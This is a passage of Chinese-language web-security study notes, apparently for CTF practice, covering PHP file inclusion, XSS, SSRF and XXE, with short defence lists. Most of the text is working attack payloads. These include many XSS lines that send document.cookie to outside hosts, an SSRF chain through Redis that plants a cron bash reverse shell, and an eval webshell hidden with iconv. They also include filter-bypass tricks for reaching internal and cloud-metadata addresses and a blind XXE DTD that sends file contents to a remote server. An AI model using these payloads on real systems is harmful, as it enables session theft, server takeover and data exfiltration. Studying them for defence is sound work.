    /proc/self/environ文件里面有Web进程运行时的环境变量，其中很多都是用户可以控制的，最常见的做法就是在User-Agent中注入PHP代码。

* 条件

    1.php以cgi方式运行，这样environ才会保持UA头；
    2.environ文件存储位置已知，且environ文件可读。

* 利用

    proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中，然后再包含利用。

## proc目录下的敏感文件

[Linux的proc文件系统，proc/&pid与/proc/self的学习---CTF应用](https://blog.csdn.net/m0_55793759/article/details/126454065)

```shell

/proc/version 内核版本信息
/proc/cpuinfo CPU相关信息
/proc/meminfo 内存相关信息
/proc/mounts 系统挂载的文件系统
/proc/modules 当前加载的内核模块
/proc/sched_debug 正在运行的进程信息
/proc/net/wireless 无线网卡信息和基础信息
/proc/net/dev 网络设备状态信息和基本统计信息
/proc/uptime 机器启动时间 启动时间/空闲时间/秒
/proc/cmdline 在启动时传递至内核的相关参数信息
/proc/net/arp Arp缓存信息，可用于枚举局域网存活主机
/proc/net/route 包含路由表信息，IP地址使用16进制格式
/proc/net/tcp tcp socket表信息，可以用于枚举网络连接和监听端口，ip地址和端口使用16进制表示


```

* `cmdline`

    cmdline文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息

    `cat /proc/1010/cmdline`

* `cwd`

    cwd文件显示链接到目前1207进程的工作目录

    `cat /proc/1207/cwd`

* `exe`

    exe是一个指向启动当前进程的可执行文件（完整路径）的符号链接，即ManagementAgentHost是该进程的启动文件

    `ls -al /proc/1207/exe`



## 包含临时文件

php中上传文件时会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。

由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。

另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接进行包含。

## 路径长度截断绕过

利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的，在window下256字节、linux下4096字节时会达到最大限制值。最大值长度之后的字符将被丢弃(php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)，利用”./“的方式即可构造出超长目录字符串：

Payload：`?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.`

另一种利用点号进行路径长度截断(php版本小于5.2.8可以成功，只适用windows，点号需要长于256)：

Payload：`?file=../../../../../../../../../boot.ini/………[…]…………`

主要用处：当环境强制给包含的文件加后缀时，用超长文件名将系统自动添加的后缀挤掉

## 日志包含方法

即使是访问，如果是从`url`进行注入，内容是经过一次编码之后记录到日志文件中的，所以无法进行包含执行语句，不完整。即使编码之后传进去，编码只有进入到PHP中才会进行解码，但是记录到日志文件是在`进入PHP`之前的一个步骤，所以日志文件中还是不可以利用的语句。

但是如果是从`UA头`进行注入的，那么内容就不会经过编码，会直接记录到日志文件中。

（这个可以自己起一个环境看一下access.log）

## `%00`截断绕过

条件：magic_quotes_gpc = Off ，php版本<5.3.4.

测试代码：

```php
<?php   
$filename  = $_GET['filename'];    
include($filename . ".html");
?>

```

通过%00截断了后面的.html扩展名过滤，成功读取test.txt文件：

Payload：http://192.168.18.128/test.php?filename=test.txt%00.

## 目录遍历绕过

可以使用”/../../”这样的方式来返回到上层目录中，这种方式又被称为目录遍历(Path Traversal)，常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)

```php

%2e%2e%2f       ->      ../
%2e%2e/         ->      ../
..%2f           ->      ../
%2e%2e%5c       ->      ..\
%2e%2e\         ->      ..\
..%5c           ->      ..\
%252e%252e%255c ->      ..\//两次url编码
..%255c         ->      ..\


```

Payload：`http://192.168.18.128/test.php/../../index.php.`

## URL绕过

使用问号绕过限制：需要题目从问号开始读取后面的文件名
实例：
Payload：`http://192.168.18.128/test.php?filename=http://192.168.18.128/test.txt?`

使用#绕过限制

Payload：`http://192.168.18.128/test.php?filename=http://192.168.18.128/test.txt%23`

## 文件开头exit绕过
>(谈一谈php://filter的妙用)[https://www.leavesongs.com/PENETRATION/php-filter-magic.html]

### 概述 

常见题目形式是写入文件时在文件头加一句`<?php exit();?>`，这样就无法执行后面的语句，但是通过`base64`特性可以绕过这个`死亡exit`。

```php

<?php
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);

```

### base64

`base64`中只包含64个可打印字符，所以如果对内容进行解码的时候，非`base64`字符(`<>?();`)就会被过滤成为`phpexit`七个字符，但是`base64`解码是4个byte一组，所以上传内容时在前面多加一个字符让`phpexitx`解码错误，但是后面的语句还可以正常执行。

`php://filter/convert.base64-decode/resource=s1mple.php`

### 反转字符

* 函数原理

    iconv ( string $in_charset , string $out_charset , string $str ) : 
    string将字符串 str 从 in_charset 转换编码到 out_charset。
    in_charset：输入的字符集。
    out_charset：输出的字符集。

* 脚本

    ```php
    //PHP版本要控制在5.2左右
    <?php
    echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[hack]);?>');
    ?>
    //?<hp pe@av(l_$OPTSh[ca]k;)>?
    ```

* 利用

    ```php
    ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
    contents=?<hp pe@av(l_$OPTSh[ca]k;)>?
    ```

## 防御措施

1.无需求的情况下设置allow_url_include和allow_url_fopen为关闭状态；

2.对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir；

3.严格检查变量是否已经初始化，尽量不使用动态包含；

4.建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符；

5.严格检查include类的文件包含函数中的参数是否外界可控；

6.不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行；

7.在发布应用程序之前测试所有已知的威胁。



# XSS   

    https://www.cnblogs.com/digdeep/p/4695348.html

* 总体姿势

    1.弹窗
    `<script>alert(1)</script>`

    2.闭合值建属性
    `"" onfocus=javascript:alert(1) //`

    3.闭合标签新建标签
    `><a href=javascript:alert(1)>haha</a>`

    4.http头XSS

    5.DOM

    ```js

    var img=document.createElement("img");
    img.src="http://www.evil.com/log?"+escape(document.cookie);
    document.body.appendChild(img)
    
    ```

## 绕过思路

* 空格绕过

    使用tab 或者回车，js中语句以分号结尾，只要没遇到分号仍然是一句

    ```js

    var a
    = "hello";

    alert(a);

    ```

    注释符/**/

    `<div style=“wid/**/th:expres/*xss*/sion(alert(‘XSS’))”>`

* 事件内javascript

    适用于
    xss-3、xss-4`'onfocus=javascript:alert(1) >//`

* 标签闭合

    适用于在单一标签内无法突破，但是没过滤尖括号双引号
    xss-02`"><script>alert(1)</script>//`    

* 标签闭合+新建标签属性内javascript

    同上
    xss-05`" > <a href=javascript:alert(1)>haha</a>`

* ASCII Unicode

    html本身支持ascii码形式

    xss-08
    `javascript:alert(1)`
    `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`


    * ascii码

        计算机内数据存储与运算都是二进制的，要想表示字母数字特殊符号就要把他们转化为二进制形式，标准ascii码用七位二进制数表示0~128个字符，剩下的一位二进制为0

        0  0  0  0  0  0  0
        64 32 16 8  4  2  0 

    * unicode编码

        Unicode编码是在基本的 ASCII码上的一个改进，可以同时兼容两种语言（及拉丁语和当地语言），也就是说，Unicode码是ASCII码的一个改进版本，这是不同点。


* 绕过集合

    * 大小写绕过

        适用于区分大小写整字被过滤`<script>`
        xss-06`" oNfocus=javascript:alert(1) > //`
    
    * 双写绕过

        适用于整字被替换为空
        xss-07`" > <scrscriptipt>alert(1)</scrscriptipt>`

    * expression半角全角混写

        `<div style="left:ｅｘｐｒｅｓｓｉｏｎ（alert(‘xss’)）;">`

    * img不写空格

        `<img/src="javascript:[code];">`

        `/，/123/，%09，%0A，%0C，%0D，%20*`

    * 十六进制

        ```html

        <script>
            
            eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x57\x29");

            //eval("alert('XSS')");

        </script>

        ```

## XSS利用

* 盗取cookie

    ```html

    <script>
    document.location="http://www.test.com/cookie.asp?cookie ='+document.cookie
    </script>

    <img src="http://www.test.com/cookie.asp?cookie='+document.cookie"></img>
    
    <script>
    new Image().src="http://www.test.com/cookie.asp?cookie="+document.cookie;
    </script>
    
    <script>
    img = new Image();
    img.src="http://www.test.com/cookie.asp?cookie="+document.cookie;
    img.width=0;
    img.height=0
    </script>

    <a href=javascript:window.location="http://xxx.ceye.io?cookie="+document.cookie;>haha</a>//

    <a href="http://xxx.ceye.io?cookie="+document.cookie;>haha</a>//

    <a href=java&#115cript:wi&#110dow.loc&#97tion="http://mzypr0.ceye.io?cookie="+document.cookie>sssssss</a>

    //编码+大小写混写
    <a hRef=jaVa&#115crIpt:wi&#110dow.loc&#97tion="http://mzypr0.ceye.io?cookie="+document.cookie>sssssss</a> 

    <script>window.open('http://你的公网ip:端口号/'+document.cookie)</script>

    <script>var img = document.createElement("img");img.src = "http://你的公网ip:端口号/?cookie="+document.cookie;</script>

    <script>window.location.href='http://你的公网ip:端口号/'+document.cookie</script>

    <script>location.href='http://你的公网ip:端口号/'+document.cookie</script>

    <input onfocus="window.open('http://你的公网ip:端口号/'+document.cookie)" autofocus>

    <svg onload="window.open('http://你的公网ip:端口号/'+document.cookie)">

    <iframe onload="window.open('http://你的公网ip:端口号/'+document.cookie)"></iframe>

    <body onload="window.open('http://你的公网ip:端口号/'+document.cookie)">
    
    document.write("<img src='http://xxx/xxx?id='>"+document.cookie+"'>")

    ```

## 常见XSS测试

```js

（1）script标签直接嵌入

    <script>alert(/xss/)</script>
    <script>window.location="http://www.baidu.com"</script>

（2）JavaScript事件：onload、onerror、onclick、onmouseover、

    <div onclick="alert('xss')">
    <body onload=alert(‘xss’)> 
    <a href="onclick=alert('xss')">登录</a>
    <img src=# onerror=alert(‘xss’)> 
    <img src=# οnmοuseοver=”alert(‘xxs’)”>

（3）Javascript URL

    <a href="javascript:alert('xss')">2</a>

（4）其他弹窗测试方式：

    <script>prompt (/xss/)</script>
    <script>confirm(/xss/)</script>
    弹窗cookie，只需将xss替换成document.cookie，例如：
    <script>alert(document.cookie)</script>

```

## 常见标签属性

* onfocus

    鼠标聚焦到该元素的时候触发，点击触发，也可以在末尾配置autoload，自动触发

* onclick

    点击触发

* onerror

    出现错误的时候触发，`<img src=111 onerror=alert('xss')>`，从错误地址加载图片触发onerror

* onload

    加载的时候执行脚本

* onmouseover

    鼠标移上去发生




## 常见过滤方法

* 关键字过滤

    关键字置空、添下划线

    绕过:大小写混写、双写、unicode编码

* `htmlspecialchars`

    将输入的特殊符号进行html实体标签化，失去功效



## XSS防御

## 小知识

* 特性

    `HTML`本身支持`ascii`码，可以`unicode编码`后传参

    `javascript:alert(1)`转换后为:

    `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`

* JS特性

    在JS代码执行过程中，如果运行过程中如果语句不完整并且没有匹配到分号结束符，那么就会继续向下执行知道形成一个完整的语句才会停止，所以即使没有分号分隔用换行也能断句，还能防止空格被替代引发的尴尬境地。

* DOM

    效果上来说也是反射型XSS，通过修改页面DOM节点形成xss

    ```js

    <script>
    var str=document.getElementById("text").value;
    docuemnt.getElementById("t").innerHTML="<a href='"+str+"'>testLink</a>"
    </script>

    <div id="t"></div>
    <input type="text" id="text" value="" />
    <input type="button" id="s" value="write" onclick="test()" />
    
    

    ```
    
# SSRF

>[国光教你SSRF打穿内网](https://www.sqlsec.com/2021/05/ssrf.html)

>内容来自于===>[SSRF详解](https://blog.csdn.net/qq_43378996/article/details/124050308)

* 概念

    SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务器发起请求的一个安全漏洞

    一般情况下，SSRF攻击的目标是从外网无法访问的`内部系统`

* 原理

    SSRF形成的原因大都是由于服务端提供了从其他服务器应用`获取数据`的功能且没有对目标地址做过滤与限制
    服务端提供了从其他服务器应用获取数据的功能。
    
    比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载文件等等。

    curl,wget

## 漏洞挖掘

* 1.分享:
    
    通过URL地址分享网页内容

* 2.转码服务:
    
    通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。

* 3.在线翻译:
    
    通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。

* 4.图片、文章收藏功能:
    
    此处的图片、文章收藏中的文章收藏就类似于分享功能中`获取URL地址中title以及文本的内容作为显示`，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。

* 5.未公开的api实现以及其他调用URL的功能:
    
    此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。

* 6.图片加载与下载:
    
    通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。

* 7.从URL关键字中寻找

    利用google 语法加上这些关键字去寻找SSRF漏洞
    
    ```php
    
    share
    wap
    url
    link
    src
    source
    target
    u
    display
    sourceURl
    imageURL
    domain

    ```
    
    简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞

## 产生SSRF漏洞的函数

>SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。

* file_get_contents:

    下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。

    ```php
    <?php
    if (isset($_POST['url'])) 
    { 
    $content = file_get_contents($_POST['url']); 
    $filename ='./images/'.rand().';img1.jpg'; 
    file_put_contents($filename, $content); 
    echo $_POST['url']; 
    $img = "<img src=\"".$filename."\"/>"; 
    } 
    echo $img; 
    ?>
    ```

* sockopen():

    以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。

    ```php

    <?php 
    function GetFile($host,$port,$link) 
    { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
            } 
        fclose($fp); 
        return $contents; 
        } 
    }
    ?>

    ```

* curl_exec():

    cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。

    ```php

    <?php 
    if (isset($_POST['url']))
    {
        $link = $_POST['url'];
        $curlobj = curl_init();
        curl_setopt($curlobj, CURLOPT_POST, 0);
        curl_setopt($curlobj,CURLOPT_URL,$link);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($curlobj);
        curl_close($curlobj);
        
        $filename = './curled/'.rand().'.txt';
        file_put_contents($filename, $result); 
        echo $result;
    }
    ?>

    ```

* 注意

    ```php

    一般情况下PHP不会开启fopen的gopher wrapper
    file_get_contents的gopher协议不能URL编码
    file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
    curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
    curl_exec() 默认不跟踪跳转，
    file_get_contents() file_get_contents支持php://input协议

    ```

## SSRF中的伪协议

>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议

```

file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务，可使用gopherus生成payload

```

* file

    利用file协议可以任意读取系统本地文件,提交参数
    这种URL Schema可以尝试从文件系统中获取文件：
    
    ```
    http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini
    ```

    用来探测主机地址信息文件位置:

    ```shell

    /etc/hosts
    /proc/net/arp
    /etc/network/interfaces
    ```

* dict

    这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：

    当访问开放端口时，脚本会显示banner 信息。
    当访问未开放端口，脚本会显示空白或者报错
    
    ```shell
    
    http://example.com/ssrf.php?dict://evil.com:1337/
    evil.com:$ nc -lvp 1337
    Connection from [192.168.0.12] port 1337[tcp/*]
    accepted (family 2, sport 31126)CLIENT libcurl 7.40.0

    # 清空 key
    dict://172.72.23.27:6379/flushall

    # 设置要操作的路径为定时任务目录
    dict://172.72.23.27:6379/config set dir /var/spool/cron/

    # 在定时任务目录下创建 root 的定时任务文件
    dict://172.72.23.27:6379/config set dbfilename root

    # 写入 Bash 反弹 shell 的 payload
    dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"

    # 保存上述操作
    dict://172.72.23.27:6379/save

    ```

* sftp

    在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。

    ```php

    http://example.com/ssrf.php?url=sftp://evil.com:1337/
    evil.com:$ nc -lvp 1337
    Connection from [192.168.0.12] port 1337[tcp/*]
    accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2

    ```

* ldap://或ldaps://或ldapi://

    LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。存储被大量查询而不以其他形式进行修改(增删改)的静态数据，并且语句也相对简化，用来优化查询速度。

    ```php

    http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
    http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
    http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
    ```

* tftp://

    TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。

    ```php

    http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
    evil.com:# nc -lvup 1337
    Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3
    ```

* gopher://


    >[Gopherus自动生成gopherpayload](https://github.com/tarunkant/Gopherus)

    [关于gopher协议](https://blog.csdn.net/xiaoka__/article/details/121225099)

    Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

    注意请求开头加个_或任意字符），例如/_，不然会丢失一个字节

    ```php

    http://example.com/ssrf.php?url=http://attacker.com/gopher.php 
    
    gopher.php (host it on acttacker.com):-<?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?>
    
    evil.com:# nc -lvp 1337
    Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest
    ```

* gopher协议的GET和POST格式

    GET数据包只需要开头两行即可

    ```php

    GET /test.php?a=Hello world HTTP/1.1
    Host: 127.0.0.1
    ```

    POST数据包需要五行

    ```php

    POST /test.php HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11          //这个长度一定要定义好，长度不对应会出错，payload改多长这里写多长
    Connection: close            //这个可以没有，但是没有的话连接结束会延迟一段时间

    a=Hello world
    ```

    编码问题上

    第一，利用ssrf时经常要进行多次url编码（传参或者多次跳转需要多次url编码，也就是说，有多少次请求就要编码多少次，直接curl后接gopher://就编码一次，利用?url=gopher://这样的形式进行ssrf利用就相当于请求了两次，需要编码两次，如果有302跳转，则还需要再编码），第一次url编码后，将所有%0a改成%0d%0a

    gopher://默认发送到70端口，一般我们需要发送到80端口，记得改

    

## SSRF漏洞利用(危害)

    1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;

    2.攻击运行在内网或本地的应用程序（比如溢出）;

    3.对内网web应用进行指纹识别，通过访问默认文件实现;

    4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;

    5.利用file协议读取本地文件等。.

    6.各个协议调用探针：http,file,dict,ftp,gopher等

    http:192.168.64.144/phpmyadmin/
    file:///D:/www.txt
    dict://192.168.64.144:3306/info
    ftp://192.168.64.144:21

    7.阻止对 IP 地址 169.254.169.254 的访问也是有益的，因为该 IP 地址包含已部署云服务器的元数据，其中可能包括敏感信息。攻击者可以通过在自己的域上注册一个子域，并将 DNS 记录指向 IP 地址 169.254.169.254，从而绕过这一限制。

## SSRF绕过方式

部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：

* 限制为http://www.xxx.com 域名时（利用@）

    ```php
    可以尝试采用http基本身份认证的方式绕过
    如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
    在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
    ```

* 采用短网址绕过

    `比如百度短地址https://dwz.cn/`

* 采用进制转换

    `127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.`
 

* 特性

    127.1也可以作为127.0.0.1

    0在linux系统中会解析成127.0.0.1

    0在windows中解析成0.0.0.0

* 利用特殊域名

    ```php
    
    原理是DNS解析。xip.io可以指向任意域名，即
    127.0.0.1.xip.io，可解析为127.0.0.1
    (xip.io 现在好像用不了了，可以找找其他的)

    127.0.0.1.nip.io
    ```

* 利用[::]

    ```php

    可以利用[::]来绕过localhost
    http://169.254.169.254>>http://[::169.254.169.254]
    ```

* 利用句号

    `127。0。0。1 >>> 127.0.0.1`

* CRLF编码绕过

    ```php
    %0d->0x0d->\r回车
    %0a->0x0a->\n换行
    进行HTTP头部注入
    example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 
    ```

* 利用封闭的字母数字

    `https://www.haomeili.net/ZhiShi/34`

    ```php

    利用Enclosed alphanumerics
    ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com
    http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
    List:
    ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
    ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
    ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
    ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
    Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
    ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
    ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
    ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

    ```

## 常见限制

* 限制为http://www.xxx.com 域名

    ```php

    采用http基本身份认证的方式绕过，即@
    http://www.xxx.com@www.xxc.com  
    ```

* 限制请求IP不为内网地址

    ```php

    当不允许ip为内网地址时：
    （1）采取短网址绕过
    （2）采取特殊域名
    （3）采取进制转换
    ```

* 限制请求只为http协议

    ```php

    （1）采取302跳转
    （2）采取短地址
    ```

## SSRF漏洞防御

通常有以下5个思路：

1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。

4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。

5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。


# XXE

>[PortSwigger-XXE](https://portswigger.net/web-security/xxe)

>https://blog.csdn.net/qq_52907838/article/details/118030007

>[Hu3sky@D0g3-浅谈XML实体注入漏洞](https://www.freebuf.com/vuls/175451.html)

* 概念

    XXE漏洞全称XML External Entity Injection 即XML外部实体注入。

    XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。

    XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

* 利用

    与SQL相似，XXE漏洞也分为有回显和无回显

    有回显，可以直接在页面中看到payload的执行结果或现象。

    无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。`即可以引用远程服务器上的XML文件读取文件。`

    解析xml在php库libxml，libxml>=2.9.0的版本中没有XXE漏洞。

* 例子

    ```s

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE note [
    <!ENTITY admin SYSTEM "file:///etc/passwd">
    ]>
    <user><username>&admin;</username><password>123456</password></user>
    -----------------------------------------------------
    ```
    payload解释:
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。

    `standalone`值是`yes`的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。

    按实体有无参分类，实体分为一般实体和参数实体，一般实体的声明：`<!ENTITY 实体名称 "实体内容">`，引用一般实体的方法：`&实体名称;`

    外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。

    因为将`file:///flag命名为admin`，所以下面用`&admin`。

    PHP引用外部实体，常见的利用协议：

    ```s
    file://文件绝对路径 如：file:///etc/passwd

    http://url/file.txt

    php://filter/read=convert.base64-encode/resource=xxx.php

    ```

    XXE盲打，读取文件无回显，要发送到远程服务器

    ```xml

    # xxe.php
    <?php
    highlight_file(__FILE__);
    $xxe = base64_decode($_GET['q']);
    $txt = 'flag.txt';
    file_put_contents($txt,$xxe,FILE_APPEND)
    ?>

    # pd.dtd
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://xxx/xxe.php?q=%file;'>">
    %all;

    <!--上面的&#37改成&#x25也可以，十六进制-->

    # payload 不写xml版本也可以
    <!DOCTYPE ANY [
    <!ENTITY % dtd SYSTEM "http://xxx/pd.dtd">
    %dtd;
    %send;
    ] >

    ```

* xxe探测内网存活主机

    ```xml

    <?xml version="1.0"?>
    <!DOCTYPE note[
    <!ENTITY test SYSTEM "file:///etc/hosts">
    ]>
    <!--/proc/net/arp查看映射表-->
    <user><username>&test;</username><password>asdd</password></user>

    ```


* 防御

    1.关闭 DTD (Data Type Definition)libxml_disable_entity_loader(true)php8.0后废弃
    2.禁止外部实体引入
    3.过滤用户提交的XML数据

    `system、file://、public、http://、expect`

## XML

* 功能

    XML被设计为传输和存储数据，其焦点是数据的内容。

    HTML被设计用来显示数据，其焦点是数据的外观。

    XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。

    XML的标签不是预定义的，可以自定义，HTML的标签都是提前写好的

* 基本语法

    所有 XML 元素都须有关闭标签。

    - XML 标签对大小写敏感。

    - XML 必须正确地嵌套。

    - XML 文档必须有根元素。

    - XML 的属性值须加引号。

    XML中直接插入标签尖括号会导致错误，所以需要使用实体引用来代替

    - 注释 `<!-- -->`

    XML中，空格会被保留，多个空格不会合并为一个

## DTD

* 概念

    文档定义类型可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例

    ```xml

    <?xml version="1.0"?>
    <!DOCTYPE note [<!--定义此文档是 note 类型的文档-->
    <!ELEMENT note (to,from,heading,body)><!--定义note元素有四个元素-->
    <!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
    <!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
    <!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
    <!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->
    ]>
    <note>
    <to>Y0u</to>
    <from>@re</from>
    <head>v3ry</head>
    <body>g00d!</body>
    </note>

    ``

    外部DTD实例

    ```xml

    <?xml version="1.0"?>
    <!DOCTYPE root-element SYSTEM "test.dtd">
    <note>
    <to>Y0u</to>
